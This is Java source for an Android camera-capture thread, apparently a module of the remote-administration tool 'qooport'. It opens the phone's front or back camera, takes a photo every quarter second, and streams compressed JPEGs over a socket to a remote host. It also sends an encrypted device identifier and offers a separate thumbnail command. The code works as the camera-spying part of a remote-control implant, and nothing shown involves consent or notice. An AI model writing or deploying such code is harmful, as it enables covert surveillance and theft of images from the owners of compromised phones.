package com.qooport.android.servidor;

import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.util.Log;
import android.view.SurfaceHolder;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import com.qooport.android.Principal;
import com.qooport.android.Servicio;
import com.qooport.android.utilidades.Compresor;
import com.qooport.android.utilidades.Protocolo;
import com.qooport.android.utilidades.cifrado.Encriptacion;

public class CapturaCamara extends Thread {

    private static final String TAG = "HILO CAMARA";
    private Camera mCamera;
    boolean mPreviewRunning = false;
    private ObjectOutputStream out;
    private ObjectInputStream in;
    private Servicio conexion;
    public boolean activo;
    private int scala;
    private String tipo;
    private int formato;
    private float calidad;
    private boolean foto;
    private boolean detener = false;
    private boolean listo = false;
    private String cameraNumber;
    private boolean enviando;
    private SurfaceHolder mSurfaceHolder;

    public CapturaCamara(Servicio conex, SurfaceHolder holder) {
        this.conexion = conex;
        activo = true;
        this.mSurfaceHolder = holder;
    }

    public boolean isDetener() {
        return detener;
    }

    public void setDetener(boolean detener) {
        this.detener = detener;
    }

    public String getCameraNumber() {
        return cameraNumber;
    }

    public void setCameraNumber(String cameraNumber) {
        this.cameraNumber = cameraNumber;
    }

    public void paso1() {
        Log.i(TAG, "PASO 1");
        int cameraCount = 0;
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        cameraCount = Camera.getNumberOfCameras();
        for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
            Camera.getCameraInfo(camIdx, cameraInfo);
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK && cameraNumber.equalsIgnoreCase("0")) {
                try {
                    mCamera = Camera.open(camIdx);
                } catch (RuntimeException e) {
                }
            }
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT && cameraNumber.equalsIgnoreCase("1")) {
                try {
                    mCamera = Camera.open(camIdx);
                } catch (RuntimeException e) {
                }
            }
        }
    }

    public void paso2() {
        Log.i(TAG, "PASO 2");
        try {
            if (mPreviewRunning) {
                mCamera.stopPreview();
                mPreviewRunning = false;
            }
        } catch (Exception e) {
        }
        try {
            Camera.Parameters p = mCamera.getParameters();
            List<Camera.Size> previewSizes = p.getSupportedPreviewSizes();
            Camera.Size previewSize = previewSizes.get(0);
            for (Camera.Size previewSize1 : previewSizes) {
                if (previewSize1.width > previewSize.width) {
                    previewSize = previewSize1;
                }
            }
            Log.i(TAG, "Vista previa tam: " + previewSize.width + ":" + previewSize.height);
            p.setPictureFormat(PixelFormat.JPEG);
            p.setJpegQuality(100);
            p.setPreviewSize(previewSize.width, previewSize.height);
//            if (cameraNumber.equalsIgnoreCase("0")) {
//                p.setRotation(90);
//            }
//            if (cameraNumber.equalsIgnoreCase("1")) {
//                p.setRotation(270);
//            }
            p.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            mCamera.setParameters(p);
        } catch (Exception e) {
            Log.e("CameraView", "error en algo q previsualiza o algo asi");
            Log.e("CameraView", e.getMessage());
            e.printStackTrace();
        }
        try {
            Log.i(TAG, "voy a setear el display del preview");
            mCamera.setPreviewDisplay(this.mSurfaceHolder);
        } catch (Exception e) {
            Log.e("CameraView", "error al previsualizar " + e.getMessage());
            e.printStackTrace();
        }
        Log.i(TAG, "empiezo la vista previa");
        mCamera.startPreview();
        mPreviewRunning = true;
        enviando = true;
        listo = true;
        Log.i(TAG, "ya termino la vista prvia voy a enviar");
    }

    public void detener() {
        enviando = false;
        activo = false;
        try {
            mCamera.stopPreview();
            mPreviewRunning = false;
            mCamera.release();
        } catch (Exception e) {
        }
    }

    public int getScala() {
        return scala;
    }

    public void setScala(int scala) {
        this.scala = scala;
    }

    public String getTipo() {
        return tipo;
    }

    public void setTipo(String tipo) {
        this.tipo = tipo;
    }

    public int getFormato() {
        return formato;
    }

    public void setFormato(int formato) {
        this.formato = formato;
    }

    public float getCalidad() {
        return calidad;
    }

    public void setCalidad(float calidad) {
        this.calidad = calidad;
    }

    @Override
    public void run() {
        try {
            paso1();
            paso2();
            Socket socket = new Socket(conexion.getHost(), (conexion.getPuertoTransferencias()));
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            out.writeInt(Protocolo.androidFoto);
            out.flush();
            out.writeObject(Compresor.comprimirGZIP(Encriptacion.cifra(Principal.identificador)));
            out.flush();
            while (activo) {
                if (listo) {
                    Thread.sleep(250);
                    mCamera.takePicture(null, mPictureCallback, mPictureCallback);
                }
            }
            try {
                mCamera.stopPreview();
                mCamera.release();
            } catch (Exception e) {
            }
            mPreviewRunning = false;
            out.close();
//            Log.i(TAG, "Termine de enviar la camara");
        } catch (Exception ex) {
//            Log.e("CAMARA", "ERROR AL ENVIAR FOTOS");
            ex.printStackTrace();
            Logger.getLogger(CapturaMicrofono.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    Camera.PictureCallback mPictureCallback = new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            if (data != null) {
                try {
                    Log.i("PICTURETAKE", "VOY A ENVIAR LA FOTO");
                    if (listo) {
                        out.writeObject(Compresor.comprimirGZIP(comprimirJPG(redimensionar_rotar(decodificarBuffer(data), 640, 480, conexion.getOrientacion()))));
                        // para probar si tomo bien la foto                    
                        System.gc();
                        Log.i("PICTURETAKE", "ENVIE LA FOTO");
                    } else {
                    }
                } catch (Exception e) {
                }
            }
        }
    };
    Camera.PictureCallback mPictureCallback2 = new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            if (data != null) {
                try {
                    Log.i("PICTURETAKE", "VOY A ENVIAR LA FOTO");
                    if (listo) {
                        conexion.enviarComando(Protocolo.webCamMiniatura);
                        conexion.enviarObjeto(Compresor.comprimirGZIP(comprimirJPG(redimensionar_rotar(decodificarBuffer(data), 640, 480, conexion.getOrientacion()))));

                        System.gc();
                        Log.i("PICTURETAKE", "ENVIE LA FOTO");
                    } else {
                    }
                } catch (Exception e) {
                }
            }
        }
    };

    public void tomarFotoVistaPrevia() {
        if (!listo) {
            paso1();
            paso2();
        }
        mCamera.takePicture(null, mPictureCallback2, mPictureCallback2);
    }

    public byte[] comprimirJPG(Bitmap bm) {
        byte[] bytes = null;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bm.compress(CompressFormat.JPEG, (int) calidad, baos);
            bytes = baos.toByteArray();
            baos.close();
        } catch (Exception e) {
            Log.e("Could not save", e.toString());
        }
        return bytes;
    }

    public static Bitmap redimensionar_rotar(Bitmap mBitmap, float newWidth, float newHeigth, int orientacion) {
        try {
            float angulo = 0;
            if (orientacion == Configuration.ORIENTATION_PORTRAIT) {
                angulo = 0;
            }
            if (orientacion == Configuration.ORIENTATION_LANDSCAPE) {
                angulo = 90;
            }
            //Redimensionamos
            int width = mBitmap.getWidth();
            int height = mBitmap.getHeight();
            float scaleWidth = ((float) newWidth) / width;
            float scaleHeight = ((float) newHeigth) / height;
            Matrix matrix = new Matrix();
            matrix.postScale(scaleWidth, scaleHeight);
            matrix.postRotate(angulo);
            return Bitmap.createBitmap(mBitmap, 0, 0, width, height, matrix, false);
        } catch (Exception e) {
            return null;
        }
    }

    private Bitmap decodificarBuffer(byte[] buffer) {
        // Decode image size
        BitmapFactory.Options o = new BitmapFactory.Options();
        return BitmapFactory.decodeStream(new ByteArrayInputStream(buffer),
                null, o);
    }

    private Bitmap decodificarYescalaBuffer(byte[] buffer) {
        // Decode image size
        BitmapFactory.Options o = new BitmapFactory.Options();
        o.inJustDecodeBounds = true;
        BitmapFactory.decodeStream(new ByteArrayInputStream(buffer), null, o);
        // The new size we want to scale to
        final int REQUIRED_SIZE = 70;
        // Find the correct scale value. It should be the power of 2.
        int width_tmp = o.outWidth, height_tmp = o.outHeight;
        int scale = 1;
        while (true) {
            if (width_tmp / 2 < REQUIRED_SIZE || height_tmp / 2 < REQUIRED_SIZE) {
                break;
            }
            width_tmp /= 2;
            height_tmp /= 2;
            scale *= 2;
        }
        // Decode with inSampleSize
        BitmapFactory.Options o2 = new BitmapFactory.Options();
        o2.inSampleSize = scale;
        return BitmapFactory.decodeStream(new ByteArrayInputStream(buffer),
                null, o2);
    }
}
